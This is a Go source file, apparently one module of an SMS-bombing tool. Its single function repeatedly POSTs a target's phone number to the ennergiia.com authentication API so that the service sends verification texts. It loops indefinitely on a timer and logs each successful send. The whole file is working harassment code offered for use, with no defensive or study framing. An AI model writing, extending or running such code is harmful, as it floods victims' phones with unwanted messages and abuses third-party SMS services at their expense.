package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func ennergiia() {
	req := newreq()
	req.SetBodyString(`{"referrer":"ennergiia","via_sms":true,"phone":"+` + num[0:1] + " (" + num[1:4] + ") " + num[4:7] + " " + num[7:9] + " " + num[9:] + `"}`)
	req.Header.SetContentType("application/json")
	req.SetRequestURI("https://api.ennergiia.com/auth/api/development/lor")
	req.Header.SetMethod("POST")

	timeout := time.Minute*10 + time.Second*2
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `"code":"200-8"`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
